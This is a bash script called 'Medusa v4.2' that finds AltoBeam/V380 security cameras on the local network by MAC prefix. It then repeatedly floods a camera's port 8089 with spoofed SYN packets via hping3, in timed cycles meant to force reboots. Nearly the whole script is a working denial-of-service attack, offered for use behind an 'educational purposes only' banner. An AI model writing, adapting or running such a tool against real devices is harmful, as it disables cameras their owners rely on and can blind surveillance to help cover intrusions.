#!/bin/bash

# --- CONFIGURATION ---
CCTV_PREFIX="38:54:f5"
TARGET_PORT=8089
ATTACK_TIME=60
REST_TIME=30
# ---------------------

# TRAP: This catches Ctrl+C (SIGINT)
trap 'echo -e "\n\n[*] The Serpents have retreated. Cleaning up..."; sudo pkill hping3 > /dev/null 2>&1; exit' SIGINT

countdown() {
    local seconds=$1
    local message=$2
    while [ $seconds -gt 0 ]; do
        printf "\r[*] $message: %02d seconds remaining..." $seconds
        sleep 1
        : $((seconds--))
    done
    printf "\r\033[K"
}

echo -e "\n\n"
echo "                               ,,"
echo "\`7MMM.     ,MMF'             \`7MM"
echo "  MMMb    dPMM                 MM"
echo "  M YM   ,M MM  .gP\"Ya    ,M\"\"bMM \`7MM  \`7MM  ,pP\"Ybd  ,6\"Yb."
echo "  M  Mb  M' MM ,M'   Yb ,AP    MM   MM    MM  8I   \`\" 8)   MM"
echo "  M  YM.P'  MM 8M\"\"\"\"\"\" 8MI    MM   MM    MM  \`YMMMa.  ,pm9MM"
echo "  M  \`YM'   MM YM.    , \`Mb    MM   MM    MM  L.   I8 8M   MM"
echo ".JML. \`'  .JMML.\`Mbmmd'  \`Wbmd\"MML. \`Mbod\"YML.M9mmmP' \`Moo9^Yo."
echo ""
echo "                        Medusa v4.2"
echo "--------------------------------------------------------------"
echo "                  EDUCATIONAL PURPOSES ONLY"
echo "--------------------------------------------------------------"
echo "DISCLAIMER: This script targets specific vulnerabilities found"
echo "in AltoBeam/V380 firmware. It is NOT guaranteed to work on all"
echo "webcams or updated hardware."
echo "--------------------------------------------------------------"

# 1. SCOUTING
echo "[*] Scouting network for AltoBeam signatures..."
TARGET_IP=$(sudo arp-scan --localnet --quiet | grep -i "$CCTV_PREFIX" | awk '{print $1}')

if [ -z "$TARGET_IP" ]; then
    echo "[-] Target not found. Ensure the camera is powered on."
    exit 1
fi

echo "[!] TARGET ACQUIRED: $TARGET_IP"
echo "--------------------------------------------------------------"
read -p "[?] Ready to petrify? (y/n): " confirm

if [[ $confirm != "y" ]]; then exit 0; fi

# 2. THE NON-STOP ATTACK
while true; do
    echo "[!] $(date +%T) Releasing Serpents..."
    
    # Run silently in background
    sudo hping3 --rand-source -S -p $TARGET_PORT --flood $TARGET_IP > /dev/null 2>&1 &
    HPING_PID=$!
    
    # Prevent job control notifications
    disown $HPING_PID 2>/dev/null
    
    countdown $ATTACK_TIME "Attacking"
    
    echo "[*] Triggering reboot cycle..."
    
    # Kill background process silently
    sudo kill -9 $HPING_PID > /dev/null 2>&1
    sudo pkill hping3 > /dev/null 2>&1
    
    countdown $REST_TIME "Recovery Pause"
done
